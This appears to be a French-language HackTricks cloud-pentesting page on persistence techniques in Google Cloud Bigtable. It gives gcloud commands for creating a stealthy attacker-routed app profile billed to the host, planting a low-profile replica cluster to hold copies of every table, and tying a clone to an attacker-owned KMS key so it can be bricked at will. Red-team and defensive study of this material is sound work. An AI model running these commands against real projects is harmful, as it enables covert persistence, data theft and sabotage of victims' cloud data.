# GCP - Bigtable Persistance

{{#include ../../../banners/hacktricks-training.md}}

## Bigtable

Pour plus d'informations sur Bigtable, consultez :

{{#ref}}
../gcp-services/gcp-bigtable-enum.md
{{#endref}}

### App Profile dédié à l'attaquant

**Permissions:** `bigtable.appProfiles.create`, `bigtable.appProfiles.update`.

Créez un app profile qui redirige le trafic vers votre replica cluster et activez Data Boost afin de ne jamais dépendre de provisioned nodes que les défenseurs pourraient remarquer.

<details>

<summary>Créer un app profile discret</summary>
```bash
gcloud bigtable app-profiles create stealth-profile \
--instance=<instance-id> --route-any --restrict-to=<attacker-cluster> \
--row-affinity --description="internal batch"

gcloud bigtable app-profiles update stealth-profile \
--instance=<instance-id> --data-boost \
--data-boost-compute-billing-owner=HOST_PAYS
```
</details>

Tant que ce profil existe, vous pouvez vous reconnecter en utilisant de nouveaux identifiants qui y font référence.

### Maintenir votre propre cluster répliqué

**Permissions:** `bigtable.clusters.create`, `bigtable.instances.update`, `bigtable.clusters.list`.

Provisionnez un cluster avec un nombre minimal de nœuds dans une région peu utilisée. Même si vos identités client disparaissent, **le cluster conserve une copie complète de chaque table** jusqu'à ce que les défenseurs la suppriment explicitement.

<details>

<summary>Créer un cluster répliqué</summary>
```bash
gcloud bigtable clusters create dark-clone \
--instance=<instance-id> --zone=us-west4-b --num-nodes=1
```
Surveillez-le via `gcloud bigtable clusters describe dark-clone --instance=<instance-id>` afin de pouvoir monter en puissance instantanément lorsque vous devez extraire des données.

### Verrouillez la réplication derrière votre propre CMEK

**Autorisations :** `bigtable.clusters.create`, `cloudkms.cryptoKeyVersions.useToEncrypt` sur la clé détenue par l'attaquant.

Apportez votre propre clé KMS lors du déploiement d'un clone. Sans cette clé, Google ne peut ni recréer ni basculer le cluster, donc les blue teams doivent se coordonner avec vous avant d'y toucher.

<details>

<summary>Créer un cluster protégé par CMEK</summary>
```bash
gcloud bigtable clusters create cmek-clone \
--instance=<instance-id> --zone=us-east4-b --num-nodes=1 \
--kms-key=projects/<attacker-proj>/locations/<kms-location>/keyRings/<ring>/cryptoKeys/<key>
```
</details>

Faites pivoter ou désactivez la clé dans votre projet pour bricker instantanément la replica (tout en vous permettant de la réactiver plus tard).

{{#include ../../../banners/hacktricks-training.md}}
